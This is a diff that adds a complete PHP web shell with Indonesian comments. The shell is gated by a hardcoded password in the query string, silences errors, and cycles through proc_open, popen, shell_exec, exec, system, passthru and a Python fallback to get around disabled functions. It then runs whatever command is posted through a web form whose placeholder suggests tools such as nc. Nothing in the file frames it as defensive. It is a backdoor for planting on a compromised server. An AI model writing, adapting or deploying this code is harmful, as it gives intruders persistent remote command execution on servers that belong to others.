@@ -1,0 +1,83 @@
+<?php
+@error_reporting(0);
+@ini_set('display_errors', 0);
+@set_time_limit(0);
+
+$password = "gass123"; // Ganti password ini biar aman
+
+if (!isset($_GET['pass']) || $_GET['pass'] !== $password) {
+    die("Access Denied");
+}
+
+// Bypass disable_functions
+function execute_command($cmd) {
+    $output = '';
+    
+    // Method 1: proc_open
+    if (function_exists('proc_open')) {
+        $descriptorspec = array(
+            0 => array("pipe", "r"),
+            1 => array("pipe", "w"),
+            2 => array("pipe", "w")
+        );
+        $process = proc_open($cmd, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            proc_close($process);
+            if ($output) return $output;
+        }
+    }
+    
+    // Method 2: popen
+    if (function_exists('popen')) {
+        $handle = popen($cmd . ' 2>&1', 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                $output .= fread($handle, 4096);
+            }
+            pclose($handle);
+            if ($output) return $output;
+        }
+    }
+    
+    // Method 3: shell_exec + alternatives
+    $funcs = array('shell_exec', 'exec', 'system', 'passthru');
+    foreach ($funcs as $func) {
+        if (function_exists($func)) {
+            ob_start();
+            $func($cmd);
+            $temp = ob_get_clean();
+            if ($temp) return $temp;
+        }
+    }
+    
+    // Method 4: Python fallback (kalau python ada)
+    if (file_exists('/usr/bin/python3') || file_exists('/usr/bin/python')) {
+        $py = "python3 -c \"import subprocess; print(subprocess.getoutput('$cmd'))\" 2>&1";
+        return execute_command($py);
+    }
+    
+    return "Command execution failed. All methods blocked.";
+}
+
+echo "<pre style='background:#000;color:#0f0;padding:10px;'>";
+echo "=== PHP CMD Bypass Disable Functions ===<br>";
+echo "Server: " . php_uname() . "<br>";
+echo "PHP Version: " . phpversion() . "<br>";
+echo "Disable Functions: " . ini_get('disable_functions') . "<br><hr>";
+
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    echo "Command: $cmd\n";
+    echo str_repeat("=", 60) . "\n";
+    echo execute_command($cmd);
+}
+
+echo "</pre>";
+?>
+
+<form method="post">
+    <input type="text" name="cmd" size="80" placeholder="Masukkan command (ls, id, whoami, nc ...)" autofocus>
+    <input type="submit" value="Execute">
+</form>
